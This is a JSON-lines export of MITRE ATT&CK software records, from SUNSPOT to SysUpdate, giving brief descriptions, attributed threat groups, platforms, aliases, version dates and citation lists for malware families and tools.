{"ID":"S0562","name":"SUNSPOT","description":"[SUNSPOT](https://attack.mitre.org/software/S0562) is an implant that injected the [SUNBURST](https://attack.mitre.org/software/S0559) backdoor into the SolarWinds Orion software update framework. It was used by [APT29](https://attack.mitre.org/groups/G0016) since at least February 2020.(Citation: CrowdStrike SUNSPOT Implant January 2021) ","url":"https://attack.mitre.org/software/S0562","created":"12 January 2021","last modified":"27 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021)"}
{"ID":"S0578","name":"SUPERNOVA","description":"[SUPERNOVA](https://attack.mitre.org/software/S0578) is an in-memory web shell written in .NET C#. It was discovered in November 2020 during the investigation of [APT29](https://attack.mitre.org/groups/G0016)'s SolarWinds cyber operation but determined to be unrelated. Subsequent analysis suggests [SUPERNOVA](https://attack.mitre.org/software/S0578) may have been used by the China-based threat group SPIRAL.(Citation: Guidepoint SUPERNOVA Dec 2020)(Citation: Unit42 SUPERNOVA Dec 2020)(Citation: SolarWinds Advisory Dec 2020)(Citation: CISA Supernova Jan 2021)(Citation: Microsoft Analyzing Solorigate Dec 2020)","url":"https://attack.mitre.org/software/S0578","created":"18 February 2021","last modified":"23 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Splunk Supernova Jan 2021),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: Carnegie Mellon University Supernova Dec 2020),(Citation: CISA Supernova Jan 2021),(Citation: Unit42 SUPERNOVA Dec 2020)"}
{"ID":"S1064","name":"SVCReady","description":"[SVCReady](https://attack.mitre.org/software/S1064) is a loader that has been used since at least April 2022 in malicious spam campaigns. Security researchers have noted overlaps between [TA551](https://attack.mitre.org/groups/G0127) activity and [SVCReady](https://attack.mitre.org/software/S1064) distribution, including similarities in file names, lure images, and identical grammatical errors.(Citation: HP SVCReady Jun 2022)","url":"https://attack.mitre.org/software/S1064","created":"10 February 2023","last modified":"18 April 2023","version":"1.0","contributors":"Akiko To, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: HP SVCReady Jun 2022)"}
{"ID":"S0519","name":"SYNful Knock","description":"[SYNful Knock](https://attack.mitre.org/software/S0519) is a stealthy modification of the operating system of network devices that can be used to maintain persistence within a victim's network and provide new capabilities to the adversary.(Citation: Mandiant - Synful Knock)(Citation: Cisco Synful Knock Evolution)","url":"https://attack.mitre.org/software/S0519","created":"19 October 2020","last modified":"14 December 2021","version":"1.0","contributors":null,"platforms":"Network","aliases":null,"type":"malware","relationship citations":",,(Citation: Cisco Synful Knock Evolution),(Citation: Mandiant - Synful Knock)"}
{"ID":"S0464","name":"SYSCON","description":"[SYSCON](https://attack.mitre.org/software/S0464) is a backdoor that has been in use since at least 2017 and has been associated with campaigns involving North Korean themes. [SYSCON](https://attack.mitre.org/software/S0464) has been delivered by the [CARROTBALL](https://attack.mitre.org/software/S0465) and [CARROTBAT](https://attack.mitre.org/software/S0462) droppers.(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020)","url":"https://attack.mitre.org/software/S0464","created":"02 June 2020","last modified":"21 October 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: McAfee Honeybee),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Unit 42 CARROTBAT November 2018)"}
{"ID":"S1018","name":"Saint Bot","description":"[Saint Bot](https://attack.mitre.org/software/S1018) is a .NET downloader that has been used by [Ember Bear](https://attack.mitre.org/groups/G1003) since at least March 2021.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )","url":"https://attack.mitre.org/software/S1018","created":"09 June 2022","last modified":"09 June 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),,(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Malwarebytes Saint Bot April 2021)"}
{"ID":"S0074","name":"Sakula","description":"[Sakula](https://attack.mitre.org/software/S0074) is a remote access tool (RAT) that first surfaced in 2012 and was used in intrusions throughout 2015. (Citation: Dell Sakula)","url":"https://attack.mitre.org/software/S0074","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Sakurel, VIPER","type":"malware","relationship citations":"(Citation: ThreatConnect Anthem),,(Citation: Dell Sakula)"}
{"ID":"S0370","name":"SamSam","description":"[SamSam](https://attack.mitre.org/software/S0370) is ransomware that appeared in early 2016. Unlike some ransomware, its variants have required operators to manually interact with the malware to execute some of its core components.(Citation: US-CERT SamSam 2018)(Citation: Talos SamSam Jan 2018)(Citation: Sophos SamSam Apr 2018)(Citation: Symantec SamSam Oct 2018)","url":"https://attack.mitre.org/software/S0370","created":"15 April 2019","last modified":"18 April 2019","version":"1.0","contributors":null,"platforms":"Windows","aliases":"Samas","type":"malware","relationship citations":",,(Citation: Sophos SamSam Apr 2018),(Citation: Talos SamSam Jan 2018)"}
{"ID":"S0053","name":"SeaDuke","description":"[SeaDuke](https://attack.mitre.org/software/S0053) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2014 to 2015. It was used primarily as a secondary backdoor for victims that were already compromised with [CozyCar](https://attack.mitre.org/software/S0046). (Citation: F-Secure The Dukes)","url":"https://attack.mitre.org/software/S0053","created":"31 May 2017","last modified":"26 April 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":"SeaDaddy, SeaDesk","type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Symantec Seaduke 2015),(Citation: F-Secure The Dukes),,(Citation: Mandiant No Easy Breach),(Citation: Unit 42 SeaDuke 2015),(Citation: FireEye WMI 2015),(Citation: Symantec Seaduke 2015),(Citation: F-Secure The Dukes)"}
{"ID":"S0345","name":"Seasalt","description":"[Seasalt](https://attack.mitre.org/software/S0345) is malware that has been linked to [APT1](https://attack.mitre.org/groups/G0006)'s 2010 operations. It shares some code similarities with [OceanSalt](https://attack.mitre.org/software/S0346).(Citation: Mandiant APT1 Appendix)(Citation: McAfee Oceansalt Oct 2018)","url":"https://attack.mitre.org/software/S0345","created":"30 January 2019","last modified":"19 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Mandiant APT1 Appendix),(Citation: McAfee Oceansalt Oct 2018),,(Citation: Mandiant APT1 Appendix),(Citation: McAfee Oceansalt Oct 2018)"}
{"ID":"S0382","name":"ServHelper","description":"[ServHelper](https://attack.mitre.org/software/S0382) is a backdoor first observed in late 2018. The backdoor is written in Delphi and is typically delivered as a DLL file.(Citation: Proofpoint TA505 Jan 2019)","url":"https://attack.mitre.org/software/S0382","created":"29 May 2019","last modified":"14 April 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Proofpoint TA505 Jan 2019),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Trend Micro TA505 June 2019),(Citation: Cybereason TA505 April 2019),,(Citation: Proofpoint TA505 Jan 2019),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Trend Micro TA505 June 2019)"}
{"ID":"S0639","name":"Seth-Locker","description":"[Seth-Locker](https://attack.mitre.org/software/S0639) is a ransomware with some remote control capabilities that has been in use since at least 2021.\n(Citation: Trend Micro Ransomware February 2021)","url":"https://attack.mitre.org/software/S0639","created":"13 August 2021","last modified":"13 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Trend Micro Ransomware February 2021)"}
{"ID":"S0596","name":"ShadowPad","description":"[ShadowPad](https://attack.mitre.org/software/S0596) is a modular backdoor that was first identified in a supply chain compromise of the NetSarang software in mid-July 2017. The malware was originally thought to be exclusively used by [APT41](https://attack.mitre.org/groups/G0096), but has since been observed to be used by various Chinese threat activity groups. (Citation: Recorded Future RedEcho Feb 2021)(Citation: Securelist ShadowPad Aug 2017)(Citation: Kaspersky ShadowPad Aug 2017) ","url":"https://attack.mitre.org/software/S0596","created":"23 March 2021","last modified":"26 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":"POISONPLUG.SHADOW","type":"malware","relationship citations":"(Citation: Recorded Future RedEcho Feb 2021),(Citation: Kaspersky CactusPete Aug 2020),(Citation: FireEye APT41 Aug 2019),(Citation: TrendMicro EarthLusca 2022),,(Citation: Securelist ShadowPad Aug 2017),(Citation: FireEye APT41 Aug 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: Kaspersky ShadowPad Aug 2017)"}
{"ID":"S0140","name":"Shamoon","description":"[Shamoon](https://attack.mitre.org/software/S0140) is wiper malware that was first used by an Iranian group known as the \"Cutting Sword of Justice\" in 2012. Other versions known as Shamoon 2 and Shamoon 3 were observed in 2016 and 2018. [Shamoon](https://attack.mitre.org/software/S0140) has also been seen leveraging [RawDisk](https://attack.mitre.org/software/S0364) and Filerase to carry out data wiping tasks. The term Shamoon is sometimes used to refer to the group using the malware as well as the malware itself.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018)(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)","url":"https://attack.mitre.org/software/S0140","created":"31 May 2017","last modified":"09 February 2021","version":"2.1","contributors":null,"platforms":"Windows","aliases":"Disttrack","type":"malware","relationship citations":",,(Citation: Symantec Shamoon 2012),(Citation: Unit 42 Shamoon3 2018),(Citation: Palo Alto Shamoon Nov 2016),(Citation: McAfee Shamoon December 2018),(Citation: FireEye Shamoon Nov 2016),(Citation: McAfee Shamoon December19 2018)"}
{"ID":"S1019","name":"Shark","description":"[Shark](https://attack.mitre.org/software/S1019) is a backdoor malware written in C# and .NET that is an updated version of [Milan](https://attack.mitre.org/software/S1015); it has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least July 2021.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021)","url":"https://attack.mitre.org/software/S1019","created":"10 June 2022","last modified":"31 August 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky Lyceum October 2021),(Citation: Accenture Lyceum Targets November 2021),,(Citation: ClearSky Siamesekitten August 2021),(Citation: Accenture Lyceum Targets November 2021)"}
{"ID":"S0546","name":"SharpStage","description":"[SharpStage](https://attack.mitre.org/software/S0546) is a .NET malware with backdoor capabilities.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020)","url":"https://attack.mitre.org/software/S0546","created":"22 December 2020","last modified":"18 August 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason Molerats Dec 2020),,(Citation: Cybereason Molerats Dec 2020),(Citation: BleepingComputer Molerats Dec 2020)"}
{"ID":"S0444","name":"ShimRat","description":"[ShimRat](https://attack.mitre.org/software/S0444) has been used by the suspected China-based adversary [Mofang](https://attack.mitre.org/groups/G0103) in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development. The name \"[ShimRat](https://attack.mitre.org/software/S0444)\" comes from the malware's extensive use of Windows Application Shimming to maintain persistence. (Citation: FOX-IT May 2016 Mofang)","url":"https://attack.mitre.org/software/S0444","created":"12 May 2020","last modified":"29 May 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: FOX-IT May 2016 Mofang)"}
{"ID":"S0445","name":"ShimRatReporter","description":"[ShimRatReporter](https://attack.mitre.org/software/S0445) is a tool used by suspected Chinese adversary [Mofang](https://attack.mitre.org/groups/G0103) to automatically conduct initial discovery. The details from this discovery are used to customize follow-on payloads (such as [ShimRat](https://attack.mitre.org/software/S0444)) as well as set up faux infrastructure which mimics the adversary's targets. [ShimRatReporter](https://attack.mitre.org/software/S0445) has been used in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development.(Citation: FOX-IT May 2016 Mofang)","url":"https://attack.mitre.org/software/S0445","created":"12 May 2020","last modified":"27 May 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":",,(Citation: FOX-IT May 2016 Mofang)"}
{"ID":"S0589","name":"Sibot","description":"[Sibot](https://attack.mitre.org/software/S0589) is dual-purpose malware written in VBScript designed to achieve persistence on a compromised system as well as download and execute additional payloads. Microsoft discovered three [Sibot](https://attack.mitre.org/software/S0589) variants in early 2021 during its investigation of [APT29](https://attack.mitre.org/groups/G0016) and the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024).(Citation: MSTIC NOBELIUM Mar 2021)","url":"https://attack.mitre.org/software/S0589","created":"12 March 2021","last modified":"27 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON RITUAL Profile),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MSTIC NOBELIUM Mar 2021)"}
{"ID":"S0610","name":"SideTwist","description":"[SideTwist](https://attack.mitre.org/software/S0610) is a C-based backdoor that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2021.(Citation: Check Point APT34 April 2021)","url":"https://attack.mitre.org/software/S0610","created":"06 May 2021","last modified":"13 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Check Point APT34 April 2021),,(Citation: Check Point APT34 April 2021)"}
{"ID":"S0623","name":"Siloscape","description":"[Siloscape](https://attack.mitre.org/software/S0623) is malware that targets Kubernetes clusters through Windows containers. [Siloscape](https://attack.mitre.org/software/S0623) was first observed in March 2021.(Citation: Unit 42 Siloscape Jun 2021)","url":"https://attack.mitre.org/software/S0623","created":"18 June 2021","last modified":"18 October 2021","version":"1.0","contributors":"Daniel Prizmant, Palo Alto Networks; Yuval Avrahami, Palo Alto Networks","platforms":"Containers, Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Unit 42 Siloscape Jun 2021)"}
{"ID":"S0007","name":"Skeleton Key","description":"[Skeleton Key](https://attack.mitre.org/software/S0007) is malware used to inject false credentials into domain controllers with the intent of creating a backdoor password. (Citation: Dell Skeleton) Functionality similar to [Skeleton Key](https://attack.mitre.org/software/S0007) is included as a module in [Mimikatz](https://attack.mitre.org/software/S0002).","url":"https://attack.mitre.org/software/S0007","created":"31 May 2017","last modified":"18 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Dell Skeleton)"}
{"ID":"S0468","name":"Skidmap","description":"[Skidmap](https://attack.mitre.org/software/S0468) is a kernel-mode rootkit used for cryptocurrency mining.(Citation: Trend Micro Skidmap)","url":"https://attack.mitre.org/software/S0468","created":"09 June 2020","last modified":"26 June 2020","version":"1.0","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: Trend Micro Skidmap)"}
{"ID":"S0633","name":"Sliver","description":"[Sliver](https://attack.mitre.org/software/S0633) is an open source, cross-platform, red team command and control framework written in Golang.(Citation: Bishop Fox Sliver Framework August 2019)","url":"https://attack.mitre.org/software/S0633","created":"30 July 2021","last modified":"17 January 2023","version":"1.1","contributors":"Achute Sharma, Keysight; Ayan Saha, Keysight","platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Cisco Talos Avos Jun 2022),(Citation: GitHub Sliver Download),(Citation: GitHub Sliver C2 DNS),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: GitHub Sliver Upload),(Citation: GitHub Sliver Netstat),(Citation: GitHub Sliver HTTP),(Citation: GitHub Sliver Screen),(Citation: GitHub Sliver File System August 2021),(Citation: GitHub Sliver C2),(Citation: GitHub Sliver Ifconfig),(Citation: GitHub Sliver Encryption)"}
{"ID":"S1035","name":"Small Sieve","description":"[Small Sieve](https://attack.mitre.org/software/S1035) is a Telegram Bot API-based Python backdoor that has been distributed using a Nullsoft Scriptable Install System (NSIS) Installer; it has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least January 2022.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: NCSC GCHQ Small Sieve Jan 2022)\n\nSecurity researchers have also noted [Small Sieve](https://attack.mitre.org/software/S1035)'s use by UNC3313, which may be associated with [MuddyWater](https://attack.mitre.org/groups/G0069).(Citation: Mandiant UNC3313 Feb 2022)","url":"https://attack.mitre.org/software/S1035","created":"16 August 2022","last modified":"14 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":"GRAMDOOR","type":"malware","relationship citations":"(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: NCSC GCHQ Small Sieve Jan 2022),,(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: NCSC GCHQ Small Sieve Jan 2022)"}
{"ID":"S0226","name":"Smoke Loader","description":"[Smoke Loader](https://attack.mitre.org/software/S0226) is a malicious bot application that can be used to load other malware.\n[Smoke Loader](https://attack.mitre.org/software/S0226) has been seen in the wild since at least 2011 and has included a number of different payloads. It is notorious for its use of deception and self-protection. It also comes with several plug-ins. (Citation: Malwarebytes SmokeLoader 2016) (Citation: Microsoft Dofoil 2018)","url":"https://attack.mitre.org/software/S0226","created":"18 April 2018","last modified":"28 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":"Dofoil","type":"malware","relationship citations":",,(Citation: Talos Smoke Loader July 2018),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Microsoft Dofoil 2018)"}
{"ID":"S0273","name":"Socksbot","description":"[Socksbot](https://attack.mitre.org/software/S0273) is a backdoor that  abuses Socket Secure (SOCKS) proxies. (Citation: TrendMicro Patchwork Dec 2017)","url":"https://attack.mitre.org/software/S0273","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: TrendMicro Patchwork Dec 2017)"}
{"ID":"S0627","name":"SodaMaster","description":"[SodaMaster](https://attack.mitre.org/software/S0627) is a fileless malware used by [menuPass](https://attack.mitre.org/groups/G0045) to download and execute payloads since at least 2020.(Citation: Securelist APT10 March 2021)","url":"https://attack.mitre.org/software/S0627","created":"21 June 2021","last modified":"11 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":"DARKTOWN, DelfsCake, dfls","type":"malware","relationship citations":"(Citation: Securelist APT10 March 2021),,(Citation: Securelist APT10 March 2021)"}
{"ID":"S0615","name":"SombRAT","description":"[SombRAT](https://attack.mitre.org/software/S0615) is a modular backdoor written in C++ that has been used since at least 2019 to download and execute malicious payloads, including [FIVEHANDS](https://attack.mitre.org/software/S0618) ransomware.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS May 2021)","url":"https://attack.mitre.org/software/S0615","created":"26 May 2021","last modified":"05 October 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: BlackBerry CostaRicto November 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: FireEye FiveHands April 2021),(Citation: BlackBerry CostaRicto November 2020)"}
{"ID":"S0516","name":"SoreFang","description":"[SoreFang](https://attack.mitre.org/software/S0516) is first stage downloader used by [APT29](https://attack.mitre.org/groups/G0016) for exfiltration and to load other malware.(Citation: NCSC APT29 July 2020)(Citation: CISA SoreFang July 2016)","url":"https://attack.mitre.org/software/S0516","created":"29 September 2020","last modified":"06 October 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: NCSC APT29 July 2020),(Citation: CISA SoreFang July 2016),,(Citation: CISA SoreFang July 2016),(Citation: NCSC APT29 July 2020)"}
{"ID":"S0543","name":"Spark","description":"\n[Spark](https://attack.mitre.org/software/S0543) is a Windows backdoor and has been in use since as early as 2017.(Citation: Unit42 Molerat Mar 2020) ","url":"https://attack.mitre.org/software/S0543","created":"15 December 2020","last modified":"18 August 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason Molerats Dec 2020),(Citation: Unit42 Molerat Mar 2020),,(Citation: Unit42 Molerat Mar 2020)"}
{"ID":"S0374","name":"SpeakUp","description":"[SpeakUp](https://attack.mitre.org/software/S0374) is a Trojan backdoor that targets both Linux and OSX devices. It was first observed in January 2019. (Citation: CheckPoint SpeakUp Feb 2019)","url":"https://attack.mitre.org/software/S0374","created":"17 April 2019","last modified":"29 March 2020","version":"1.1","contributors":null,"platforms":"Linux, macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: CheckPoint SpeakUp Feb 2019)"}
{"ID":"S0646","name":"SpicyOmelette","description":"[SpicyOmelette](https://attack.mitre.org/software/S0646) is a JavaScript based remote access tool that has been used by [Cobalt Group](https://attack.mitre.org/groups/G0080) since at least 2018.(Citation: Secureworks GOLD KINGSWOOD September 2018)","url":"https://attack.mitre.org/software/S0646","created":"21 September 2021","last modified":"18 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks GOLD KINGSWOOD September 2018),,(Citation: Secureworks GOLD KINGSWOOD September 2018)"}
{"ID":"S1030","name":"Squirrelwaffle","description":"[Squirrelwaffle](https://attack.mitre.org/software/S1030) is a loader that was first seen in September 2021. It has been used in spam email campaigns to deliver additional malware such as [Cobalt Strike](https://attack.mitre.org/software/S0154) and the [QakBot](https://attack.mitre.org/software/S0650) banking trojan.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021)","url":"https://attack.mitre.org/software/S1030","created":"09 August 2022","last modified":"26 August 2022","version":"1.0","contributors":"Catherine Williams, BT Security; Harry Hill, BT Security; Sebastian Showell-Westrip, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: ZScaler Squirrelwaffle Sep 2021)"}
{"ID":"S0058","name":"SslMM","description":"[SslMM](https://attack.mitre.org/software/S0058) is a full-featured backdoor used by [Naikon](https://attack.mitre.org/groups/G0019) that has multiple variants. (Citation: Baumgartner Naikon 2015)","url":"https://attack.mitre.org/software/S0058","created":"31 May 2017","last modified":"18 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CameraShy),(Citation: Baumgartner Naikon 2015),,(Citation: Baumgartner Naikon 2015)"}
{"ID":"S0188","name":"Starloader","description":"[Starloader](https://attack.mitre.org/software/S0188) is a loader component that has been observed loading [Felismus](https://attack.mitre.org/software/S0171) and associated tools. (Citation: Symantec Sowbug Nov 2017)","url":"https://attack.mitre.org/software/S0188","created":"16 January 2018","last modified":"18 March 2020","version":"1.1","contributors":"Alan Neville, @abnev","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Sowbug Nov 2017),,(Citation: Symantec Sowbug Nov 2017)"}
{"ID":"S0380","name":"StoneDrill","description":"[StoneDrill](https://attack.mitre.org/software/S0380) is wiper malware discovered in destructive campaigns against both Middle Eastern and European targets in association with [APT33](https://attack.mitre.org/groups/G0064).(Citation: FireEye APT33 Sept 2017)(Citation: Kaspersky StoneDrill 2017)","url":"https://attack.mitre.org/software/S0380","created":"14 May 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"DROPSHOT","type":"malware","relationship citations":"(Citation: FireEye APT33 Sept 2017),,(Citation: Symantec Elfin Mar 2019),(Citation: Kaspersky StoneDrill 2017)"}
{"ID":"S0142","name":"StreamEx","description":"[StreamEx](https://attack.mitre.org/software/S0142) is a malware family that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009) since at least 2015. In 2016, it was distributed via legitimate compromised Korean websites. (Citation: Cylance Shell Crew Feb 2017)","url":"https://attack.mitre.org/software/S0142","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cylance Shell Crew Feb 2017),,(Citation: Cylance Shell Crew Feb 2017)"}
{"ID":"S1034","name":"StrifeWater","description":"[StrifeWater](https://attack.mitre.org/software/S1034) is a remote-access tool that has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) in the initial stages of their attacks since at least November 2021.(Citation: Cybereason StrifeWater Feb 2022)","url":"https://attack.mitre.org/software/S1034","created":"15 August 2022","last modified":"11 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason StrifeWater Feb 2022),,(Citation: Cybereason StrifeWater Feb 2022)"}
{"ID":"S0491","name":"StrongPity","description":"[StrongPity](https://attack.mitre.org/software/S0491) is an information stealing malware used by [PROMETHIUM](https://attack.mitre.org/groups/G0056).(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)","url":"https://attack.mitre.org/software/S0491","created":"20 July 2020","last modified":"15 October 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),,(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020)"}
{"ID":"S0603","name":"Stuxnet","description":"[Stuxnet](https://attack.mitre.org/software/S0603) was the first publicly reported piece of malware to specifically target industrial control systems devices. [Stuxnet](https://attack.mitre.org/software/S0603) is a large and complex piece of malware that utilized multiple different behaviors including multiple zero-day vulnerabilities, a sophisticated Windows rootkit, and network infection routines.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)(Citation: CISA ICS Advisory ICSA-10-272-01)(Citation: ESET Stuxnet Under the Microscope)(Citation: Langer Stuxnet) [Stuxnet](https://attack.mitre.org/software/S0603) was discovered in 2010, with some components being used as early as November 2008.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011) ","url":"https://attack.mitre.org/software/S0603","created":"14 December 2020","last modified":"20 March 2023","version":"1.3","contributors":null,"platforms":"Windows","aliases":"W32.Stuxnet","type":"malware","relationship citations":",,(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)"}
{"ID":"S0018","name":"Sykipot","description":"[Sykipot](https://attack.mitre.org/software/S0018) is malware that has been used in spearphishing campaigns since approximately 2007 against victims primarily in the US. One variant of [Sykipot](https://attack.mitre.org/software/S0018) hijacks smart cards on victims. (Citation: Alienvault Sykipot DOD Smart Cards) The group using this malware has also been referred to as Sykipot. (Citation: Blasco 2013)","url":"https://attack.mitre.org/software/S0018","created":"31 May 2017","last modified":"13 May 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Blasco 2013),(Citation: AlienVault Sykipot 2011),(Citation: Alienvault Sykipot DOD Smart Cards)"}
{"ID":"S0242","name":"SynAck","description":"[SynAck](https://attack.mitre.org/software/S0242) is variant of Trojan ransomware targeting mainly English-speaking users since at least fall 2017. (Citation: SecureList SynAck Doppelgänging May 2018) (Citation: Kaspersky Lab SynAck May 2018)","url":"https://attack.mitre.org/software/S0242","created":"17 October 2018","last modified":"08 September 2021","version":"1.3","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Kaspersky Lab SynAck May 2018),(Citation: SecureList SynAck Doppelgänging May 2018)"}
{"ID":"S0060","name":"Sys10","description":"[Sys10](https://attack.mitre.org/software/S0060) is a backdoor that was used throughout 2013 by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)","url":"https://attack.mitre.org/software/S0060","created":"31 May 2017","last modified":"18 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Baumgartner Naikon 2015),,(Citation: Baumgartner Naikon 2015)"}
{"ID":"S0663","name":"SysUpdate","description":"[SysUpdate](https://attack.mitre.org/software/S0663) is a backdoor written in C++ that has been used by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2020.(Citation: Trend Micro Iron Tiger April 2021)","url":"https://attack.mitre.org/software/S0663","created":"29 November 2021","last modified":"20 March 2023","version":"1.1","contributors":null,"platforms":"Linux, Windows","aliases":"FOCUSFJORD, HyperSSL, Soldier","type":"malware","relationship citations":"(Citation: Trend Micro Iron Tiger April 2021),,(Citation: Lunghi Iron Tiger Linux),(Citation: Trend Micro Iron Tiger April 2021)"}
